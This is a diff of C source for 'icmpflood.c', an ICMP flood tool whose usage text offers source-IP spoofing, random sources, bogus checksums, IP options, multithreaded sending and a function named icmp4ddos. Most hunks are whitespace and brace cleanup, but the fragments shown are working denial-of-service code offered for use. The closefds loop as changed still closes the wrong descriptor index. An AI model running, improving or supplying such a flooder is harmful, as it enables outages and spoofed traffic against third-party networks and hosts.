@@ -3,7 +3,7 @@
  *
  * Redistribution and use in source and binary forms, with or without
  * modification, are permitted provided that the following conditions are met:
- * 
+ *
  * 1. Redistributions of source code must retain the above copyright notice, this
  *    list of conditions and the following disclaimer.
  * 2. Redistributions in binary form must reproduce the above copyright notice,
@@ -80,7 +80,7 @@ const struct option     longopts[]={
   {"type", required_argument, 0, 2},
   {"code", required_argument, 0, 3},
   {"randomsrc", no_argument, 0, 4},
-  {"pps", required_argument, 0, 5},  
+  {"pps", required_argument, 0, 5},
   {"threads", required_argument, 0, 6},
   {"data-len", required_argument, 0, 7},
   {"data-string", required_argument, 0, 8},
@@ -101,7 +101,7 @@ static noreturn void usage(void)
 
   puts("Usage");
   printf("  %s [flags] <target>\n\n", run);
-  puts("  -type <8/13/15/17>    set icmp type and icmp message(8=ECHO,13=TSTAMP,15=INFO,17=MASK)");    
+  puts("  -type <8/13/15/17>    set icmp type and icmp message(8=ECHO,13=TSTAMP,15=INFO,17=MASK)");
   puts("  -pps <num>            set max packets per second (default 10000) (unlimited=0)");
   puts("  -threads <num>        set num threads (default 1)");
   puts("  -fdnum <num>          set max fds for send (default 1)");
@@ -111,7 +111,7 @@ static noreturn void usage(void)
   puts("  -ttl <num>            set timetolive (default 121)");
   puts("  -randomsrc            use random source ipaddr");
   puts("  -src                  set your spoof src");
-  puts("  -updt <num>           after how many packages to update the current one? (default 10000)");  
+  puts("  -updt <num>           after how many packages to update the current one? (default 10000)");
   puts("  -ttl <count>          set TTL on IP header");
   puts("  -badsum               send packets with a bogus checksum");
   puts("  -ipopt <fmt>          adding ip option in packets (fmt <R|S [route]|L [route]|T|U |[HEX]>)");
@@ -131,12 +131,11 @@ static void parseargs(int argc, char **argv)
   while ((rez=getopt_long_only(argc, argv, shortopts, longopts, &index))!=-1){
     switch (rez) {
     case 'h': usage();
-    case 1: {
+    case 1:
       fdnum=atoll(optarg);
       if (fdnum>MAXFDS)
-	errx(1, "err: max num fds is %lld, your num is \"%lld\"", MAXFDS, fdnum);
+        errx(1, "err: max num fds is %lld, your num is \"%lld\"", MAXFDS, fdnum);
       break;
-    }
     case 2: type=atoi(optarg); break;
     case 3: code=atoi(optarg); break;
     case 4: randomsrc=1; break;
@@ -145,24 +144,24 @@ static void parseargs(int argc, char **argv)
     case 7:
       datalen=atoll(optarg);
       if (datalen>1400)
-	errx(1, "err: maximum ETH payload is (1400), your is \"%d\"", datalen);      
+        errx(1, "err: maximum ETH payload is (1400), your is \"%d\"", datalen);
       data=random_str(datalen, DEFAULT_DICTIONARY);
      break;
     case 8:
       data=optarg;
       datalen=data?strlen(data):0;
       if (datalen>1400)
-	errx(1, "err: maximum ETH payload is (1400), your is \"%d\"", datalen);
+        errx(1, "err: maximum ETH payload is (1400), your is \"%d\"", datalen);
       break;
     case 9:
       mtu=atoi(optarg);
       if (mtu >! 0 && mtu % 8 != 0)
-	errx(1, "err: data payload MTU must be > 0 and multiple of 8: (8,16,32,64,128...), your is \"%d\"", mtu);
+        errx(1, "err: data payload MTU must be > 0 and multiple of 8: (8,16,32,64,128...), your is \"%d\"", mtu);
       break;
     case 10:
       ttl=atoi(optarg);
       if (ttl>UCHAR_MAX||ttl<=0)
-	errx(1, "err: the permissible TTL corresponds to this range (1-255), your is \"%d\"", ttl);
+        errx(1, "err: the permissible TTL corresponds to this range (1-255), your is \"%d\"", ttl);
       break;
     case 11: updt=atoll(optarg); break;
     case 12: badsum=1; break;
@@ -188,8 +187,9 @@ static void parseargs(int argc, char **argv)
 static void openfds(void)
 {
   size_t i;
+  i=0;
   memset(&fds, 0, MAXFDS+1);
-  for (i=0;fdnum;fdnum--)
+  for (;fdnum;fdnum--)
     fds[++i]=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 }
 
@@ -200,10 +200,10 @@ static void openfds(void)
 static void closefds(void)
 {
   size_t i;
-  for (i=0;i<MAXFDS;) {
+  i=0;
+  for (;i<MAXFDS;)
     if (fds[i++]!=-1)
       close(fds[i]);
-  }
 }
 
 
@@ -218,7 +218,7 @@ static void icmp4msg(void)
   case ICMP4_ECHO:
     msg=icmp4_msg_echo_build((u16)cmwc_random(), (u16)cmwc_random(), data, &msglen);
     break;
-    
+
   /*
    * The other messages do not support payload, and there
    * is no point in adding it.
@@ -261,7 +261,7 @@ static void icmp4build(void)
 static void icmp4udpt(void)
 {
   switch (type) {
-    
+
     /*
      * The ICMP4_INFO message header completely matches the
      * ICMP4_ECHO message header, so the following action is
@@ -287,7 +287,7 @@ static void icmp4udpt(void)
       icmp4_msg_mask *mask=(icmp4_msg_mask*)(pkt+(sizeof(icmp4h_t)+sizeof(ip4h_t)));
       mask->id=htons((u16)cmwc_random());
       mask->seq=htons((u16)cmwc_random());
-      
+
       /*
        * Since inet_addr itself already translates the IP address
        * as after htonl, specifying via htonl is not required.
@@ -327,7 +327,7 @@ static void resetcall(void)
  * from it, adding counters, if the number of packets
  * sent corresponds to the number after which it is
  * necessary to update packets (updt), then it updates.
- * At the same time it keeps pps. 
+ * At the same time it keeps pps.
  */
 static void *icmp4preddos(void *arg)
 {
@@ -342,7 +342,7 @@ static void *icmp4preddos(void *arg)
       icmp4udpt();
     if (pps!=0) {
       while (total_calls >= pps)
-	pthread_cond_wait(&call_cond, &call_mutex);
+        pthread_cond_wait(&call_cond, &call_mutex);
       total_calls++;
       ip4_send(NULL, fd, &dstin, mtu, pkt, pktlen);
       usleep((1000000/pps));
@@ -366,9 +366,9 @@ static void icmp4ddos(void)
   pthread_t threads[threadsnum];
   pthread_t reset_thread;
   size_t i;
-  
+
   pthread_create(&reset_thread, NULL, (void *(*)(void *))resetcall, NULL);
-  
+
   for (i = 0; i < threadsnum; ++i)
     pthread_create(&threads[i], NULL, icmp4preddos, NULL);
   for (i = 0; i < threadsnum; ++i)
@@ -411,7 +411,7 @@ const char *stricmptype(void)
 
 /*
  * icmpflood.c
- */ 
+ */
 int main(int argc, char **argv)
 {
   signal(SIGINT, stop);
@@ -450,7 +450,7 @@ int main(int argc, char **argv)
     src=ncs_inet_addr(strsrc);
     free(strsrc);
   }
-  
+
   /*
    * Updates the timer for generation, and it uses CMWC,
    * not MT19937. Because the former is too slow and
@@ -470,7 +470,7 @@ int main(int argc, char **argv)
    * and DDOS itself.
    */
   printf("> Benchmark for patient \"%s\" payload is %ld bytes,\n    info: type=[%s] pps=[%ld] threads=[%ld] fdnum=[%ld];\n",
-	 ip4, datalen, stricmptype(), pps, threadsnum, fdnum);
+    ip4, datalen, stricmptype(), pps, threadsnum, fdnum);
   start=clock();
   openfds();
   icmp4ddos();
